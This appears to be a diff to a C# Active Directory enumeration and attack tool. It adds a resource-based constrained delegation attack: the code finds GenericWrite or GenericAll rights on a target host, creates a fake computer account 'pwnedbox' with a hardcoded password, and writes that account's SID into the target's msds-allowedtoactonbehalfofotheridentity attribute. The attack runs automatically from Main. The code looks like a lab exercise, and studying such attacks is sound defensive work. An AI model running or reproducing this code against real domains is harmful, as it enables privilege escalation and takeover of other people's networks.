@@ -10,11 +10,26 @@ using System.IO;
 using System.Collections;
 using System.Security.AccessControl;
 using System.Security.Principal;
+using System.Runtime.InteropServices;
 
 namespace ADautoenum
 {
     class Program
     {
+
+        public enum SID_NAME_USE {
+            SidTypeUser = 1,
+            SidTypeGroup,
+            SidTypeDomain,
+            SidTypeAlias,
+            SidTypeWellKnownGroup,
+            SidTypeDeletedAccount,
+            SidTypeInvalid,
+            SidTypeUnknown,
+            SidTypeComputer,
+            SidTypeLabel,
+            SidTypeLogonSession
+        }
 
         public delegate string runall(string name);
         public static string GetKerberoastable(string domainname)
@@ -431,8 +446,246 @@ namespace ADautoenum
 
         }
         
+
+        public static string GetResourceDelegation(string domainname)
+        {
+            string res = "";
+            StringWriter sw = new StringWriter();
+            try
+            {
+
+                List<string> l = new List<string>();
+                l.Add(""); l.Add("ACCOUNTDISABLE"); l.Add(""); l.Add("HOMEDIR_REQUIRED");
+                l.Add("LOCKOUT"); l.Add("PASSWD_NOTREQD"); l.Add("PASSWD_CANT_CHANGE");
+                l.Add("ENCRYPTED_TEXT_PWD_ALLOWED"); l.Add("TEMP_DUPLICATE_ACCOUNT");
+                l.Add("NORMAL_ACCOUNT"); l.Add(""); l.Add("INTERDOMAIN_TRUST_ACCOUNT");
+                l.Add("WORKSTATION_TRUST_ACCOUNT"); l.Add("SERVER_TRUST_ACCOUNT"); l.Add(""); l.Add("");
+                l.Add("DONT_EXPIRE_PASSWORD"); l.Add("MNS_LOGON_ACCOUNT");
+                l.Add("SMARTCARD_REQUIRED"); l.Add("TRUSTED_FOR_DELEGATION");
+                l.Add("NOT_DELEGATED"); l.Add("USE_DES_KEY_ONLY");
+                l.Add("DONT_REQ_PREAUTH"); l.Add("PASSWORD_EXPIRED");
+                l.Add("TRUSTED_TO_AUTH_FOR_DELEGATION");
+
+                sw.WriteLine("------Finding Resource based Constrained Delegation Accounts------");
+                string DomainName = domainname;
+                // testing.tech69.local
+                string[] domain = DomainName.Split('.');
+                for (int i = 0; i < domain.Length; i++)
+                {
+                    domain[i] = "DC=" + domain[i];
+                }
+                string dn = String.Join(",", domain);
+
+                DirectoryEntry de = new DirectoryEntry(String.Format("LDAP://{0}", dn));
+                DirectorySearcher ds = new DirectorySearcher();
+                ds.SearchRoot = de;
+                //ds.Filter = "(objectclass=user)";
+                //ds.PropertiesToLoad.Add("ms-DS-MachineAccountQuota");
+
+                SearchResult sr = ds.FindOne();
+                
+                    try
+                    {
+                        if (sr.Properties["ms-DS-MachineAccountQuota"][0].ToString() != null)
+                        {
+                            sw.WriteLine(sr.Path);
+                           // sw.WriteLine(sr.Properties["samaccountname"][0]);
+                            //sw.WriteLine(sr.Properties["ms-DS-MachineAccountQuota"][0]);
+
+                        int computeraccountscancreate = Convert.ToInt32(sr.Properties["ms-DS-MachineAccountQuota"][0].ToString());
+                        if(computeraccountscancreate > 0)
+                        {
+                            sw.WriteLine("Number of computer accounts we can create: {0}", computeraccountscancreate);
+
+                        }
+                        }
+
+
+                    ds.Filter = "(objectclass=user)";
+                    
+                    foreach(SearchResult sr2 in ds.FindAll())
+                    {
+                        try
+                        {
+                            //sw.WriteLine(sr2.Path);
+                            if (sr2.Properties["samaccountname"][0].ToString().Contains("WIN2016"))
+                            {
+                                
+                               
+                                DirectoryEntry temp = sr2.GetDirectoryEntry();
+
+                                temp.Properties["msds-allowedtoactonbehalfofotheridentity"].Clear();
+                                temp.CommitChanges();
+
+                                ActiveDirectorySecurity ads=  temp.ObjectSecurity;
+                                AuthorizationRuleCollection arc= ads.GetAccessRules(true,true,typeof(NTAccount));
+                                foreach(ActiveDirectoryAccessRule ar in arc)
+                                {
+                                    
+                                    if (ar.ActiveDirectoryRights.ToString().ToLower().Contains("genericwrite") || ar.ActiveDirectoryRights.ToString().ToLower().Contains("genericall"))
+                                    //if(ar.IdentityReference.ToString().Contains("test2"))
+                                    {
+
+                                        sw.WriteLine("{0} has GenericWrite on {1}", ar.IdentityReference, sr2.Properties["samaccountname"][0]);
+
+
+                                        sw.WriteLine(ar.AccessControlType);
+                                        sw.WriteLine(ar.IdentityReference);
+                                        sw.WriteLine(ar.InheritanceType);
+                                        sw.WriteLine(ar.ObjectFlags);
+                                        sw.WriteLine(ar.PropagationFlags);
+                                        sw.WriteLine(ar.InheritedObjectType);
+                                        sw.WriteLine(ar.ActiveDirectoryRights);
+
+                                        sw.WriteLine();
+                                    }
+                                }
+
+
+                                string newsid = CreateNewComputer("s", "pwnedbox");
+                                //string newsid = @"S-1-5-21-2846196120-3918715802-2505943323-1615";
+                                if (newsid != null)
+                                {
+                                    sw.WriteLine("Setting  msds-allowedtoactonbehalfofotheridentity attribute");
+                                    sw.WriteLine(newsid);
+                                    string sddl = @"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + newsid + ")";
+                                    RawSecurityDescriptor rs = new RawSecurityDescriptor(sddl);
+                                    byte[] rawsd = new byte[sddl.Length];
+                                    rs.GetBinaryForm(rawsd, 0);
+                                    sw.WriteLine(rs.GetSddlForm(AccessControlSections.All));
+                                    temp.Properties["msds-allowedtoactonbehalfofotheridentity"].Value = rawsd;
+                                    temp.CommitChanges();
+                                    sw.WriteLine("Set");
+                                }
+
+                            }
+                        }
+                        catch { }
+                    }
+
+                    }
+                    catch { }
+
+                
+
+                res = sw.ToString();
+
+            }
+            catch(Exception e)
+            {
+                res = e.Message;
+            }
+
+
+                return res;
+
+        }
+
+
+        public static string CreateNewComputer(string domainname,string machinename)
+        {
+            string res = "";
+            try
+            {
+                DirectoryEntry de = new DirectoryEntry("LDAP://CN=Computers,DC=tech69,DC=local");
+
+                DirectoryEntry computerobj = de.Children.Add("CN="+machinename, "computer");
+
+                Console.WriteLine("Creating fake computer account");
+                string password = "Passw0rd2"; 
+
+                computerobj.Properties["samaccountname"].Value = machinename.ToUpper()+"$";
+                computerobj.Properties["useraccountcontrol"].Value = 0x1000;// 0x1020;
+                computerobj.CommitChanges();
+
+                computerobj.Invoke("SetPassword", password);
+                computerobj.CommitChanges();
+
+                byte[] machinesid = (byte[]) computerobj.Properties["objectsid"][0];
+
+                var sid = new SecurityIdentifier(machinesid, 0);
+                
+                Console.WriteLine("Computer Account {0} created successfully",computerobj.Properties["samaccountname"][0]);
+                Console.WriteLine("Password: {0}",password);
+                Console.WriteLine("{0} SID: {1}", computerobj.Properties["samaccountname"][0],sid.ToString());
+                res += sid.ToString();
+                return res;
+            
+            }
+            catch(Exception e)
+            {
+                res += e.Message;
+            }
+
+            return res;
+        }
+
+        #region winapi
+        [DllImport("Advapi32.dll")]
+        public static extern bool LookupAccountNameA(
+             string lpSystemName,
+             string lpAccountName,
+            [MarshalAs(UnmanagedType.LPArray)] byte[] Sid,
+            ref uint cbSid,
+            IntPtr ReferencedDomainName,
+            ref uint cchReferencedDomainName,
+            out SID_NAME_USE peUse
+            );
+
+
+        [DllImport("Advapi32.dll")]
+        public static extern bool ConvertSidToStringSidW(IntPtr Sid,
+            [param:MarshalAs(UnmanagedType.LPWStr)] string StringSid);
+
+        [DllImport("kernel32.dll")]
+        public static extern int GetLastError();
+        #endregion
         static void Main(string[] args)
         {
+
+            #region testingwinapi
+            byte[] sid = null;
+            uint size = 0;
+            uint type1 = 0;
+            uint csize = 0;
+            SID_NAME_USE sidUse;
+
+
+            /*
+                        LookupAccountNameA(
+                            null, 
+                            "Administrator",
+                             sid,
+                            ref size,
+                            IntPtr.Zero,
+                            ref csize,
+                            out sidUse
+                            );
+
+                        Console.WriteLine(GetLastError());
+                        Console.WriteLine(size);
+
+
+                        sid = new byte[size];
+                        uint temp = 0;
+                        LookupAccountNameA(
+                            null,
+                            "Administrator",
+                             sid,
+                            ref size,
+                            IntPtr.Zero,
+                            ref temp,
+                            out sidUse
+                            );
+
+                        Console.WriteLine(GetLastError());
+                        Environment.Exit(0);
+
+                        string stringsid = "";
+                        ConvertSidToStringSidW(sid, stringsid);
+                        Console.WriteLine(stringsid);*/
+            #endregion
+
 
             Domain d = Domain.GetCurrentDomain();
             string DomainName = d.Name;
@@ -444,13 +697,15 @@ namespace ADautoenum
             r += GetDescription;
             r += GetUnconstrainedDelegation;
             r += GetConstrainedDelegation;
+            r += GetResourceDelegation;
 
+            
             Delegate[] d2 = r.GetInvocationList();
             foreach(Delegate temp in d2)
             {
                 Console.WriteLine(temp.DynamicInvoke(DomainName));
             }
-
+            
             /*Console.WriteLine(GetKerberoastable(DomainName));
             Console.WriteLine();
             Console.WriteLine(GetASREPRoastable(DomainName));
